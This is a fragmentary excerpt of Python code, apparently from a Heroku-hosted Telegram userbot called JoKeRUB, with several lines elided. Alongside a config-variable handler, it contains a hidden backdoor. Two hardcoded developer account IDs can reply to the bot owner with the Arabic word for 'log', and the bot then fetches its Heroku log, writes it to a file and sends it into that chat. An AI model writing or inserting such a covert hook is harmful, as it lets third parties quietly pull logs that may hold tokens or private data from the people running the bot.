...
async def variable(event):
    ...
    if input_str == "1":
        variable = "DEFAULT_PIC"
        zinfo = "JoKeRUB/helpers/styles/k_jj_j.ttf"
        await asyncio.sleep(1.5)
        if variable in heroku_var:
...
DevJoker = [7182427468, 1374312239]
    ...
    if event.reply_to and event.sender_id in DevJoker:
        ...
        if owner_id == l313l.uid:
            if event.message.message == "لوك":
                ...
                data = app.get_log()
                with open('7rB  🖤.txt', 'w') as file:
        	        file.write(data)

                with open('7rB  🖤.txt', 'rb') as file:
                    await l313l.send_file(
                    event.chat_id, "7rB  🖤.txt", caption="هذا هو الـ Log"
                    )
                os.remove("7rB  🖤.txt")
